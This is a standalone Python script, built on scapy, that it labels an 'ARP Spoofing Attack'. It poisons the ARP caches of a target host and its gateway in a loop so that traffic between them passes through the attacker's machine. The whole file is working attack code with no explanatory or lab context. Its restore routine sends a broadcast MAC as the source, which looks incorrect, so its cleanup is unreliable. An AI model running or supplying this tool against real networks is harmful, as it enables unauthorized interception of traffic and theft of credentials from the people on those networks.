from scapy.all import ARP, send
import time
import argparse

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, gateway_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc="ff:ff:ff:ff:ff:ff")
    send(packet, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    args = parser.parse_args()

    print(f"[+] ARP spoofing started: {args.target} <-> {args.gateway}")

    try:
        while True:
            spoof(args.target, args.gateway)
            spoof(args.gateway, args.target)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Restoring network...")
        restore(args.target, args.gateway)
        restore(args.gateway, args.target)
        print("[+] Restored")

if __name__ == "__main__":
    main()
